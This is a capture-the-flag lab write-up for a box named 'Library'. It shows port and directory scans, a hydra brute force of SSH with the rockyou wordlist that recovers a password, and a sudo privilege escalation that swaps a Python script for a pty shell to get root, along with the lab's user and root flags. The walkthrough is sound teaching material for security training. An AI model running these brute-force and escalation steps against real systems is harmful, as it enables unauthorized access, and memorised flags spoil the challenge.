# Library

## Links 
- 10.10.132.204/



## Port Scanning
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   51.13 ms  10.17.0.1
2   ... 4
5   173.88 ms 10.10.132.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds

```
- It seem there is a ssh port there but nothing serious found!

## Directory Enum
```sh
gobuster dir -u http://10.10.132.204 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.132.204
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/images               (Status: 301) [Size: 315] [--> http://10.10.132.204/images/]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
  



```
## Webpage
- After trying to get into ` http://10.10.132.204` this
- we found a name `(meliodas)` who worte a blog on that website
- Lets assume it is a username for ssh
- Now we need a password

- If we go to the url `http://10.10.132.204/robots.txt`
```sh
User-agent: rockyou 
Disallow: /

```
- In this hint we can assume that we have to bruteFroce the name `meliodas` with the in built `rockyou` file
- we can use `hydra`




## BruteFrocing the ssh server
```sh
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 6 ssh://10.10.132.204

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-13 20:35:02
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://10.10.132.204:22/
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 6 active
[STATUS] 42.00 tries/min, 126 tries in 00:03h, 14344273 to do in 5692:11h, 6 active
[22][ssh] host: 10.10.132.204   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-13 20:40:28

```
- `login: meliodas   password: iloveyou1`
## Resource
- Username - `meliodas`
- Password- `iloveyou1`

## SSH remote Login
```sh
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt 
6d488cbb3f111d135722c33cb635f4ec

```
- `sudo -l`
```sh
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
```sh
meliodas@ubuntu:~$ ls -al
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```
- bak.py is write protected
- lets make a copy of bak.py and remove the original one to avoid the write protection

```sh
meliodas@ubuntu:~$ cp bak.py bak.py.org
meliodas@ubuntu:~$ rm /home/meliodas/bak.py
rm: remove write-protected regular file '/home/meliodas/bak.py'? yes
meliodas@ubuntu:~$ ls
bak.py.org  user.txt

```
```sh
echo 'import pty; pty.spawn("/bin/sh")' > bak.py

meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/sh")' > bak.py
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
bak.py	bak.py.org  user.txt
# pwd
/home/meliodas
# cd ..
# cd ..
# ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
# cd  root
# ls
root.txt
# cat root.txt 
e8c8c6c256c35515d1d344ee0488c617


```
## Flags
- User = `6d488cbb3f111d135722c33cb635f4ec`
- ROOT = `e8c8c6c256c35515d1d344ee0488c617`
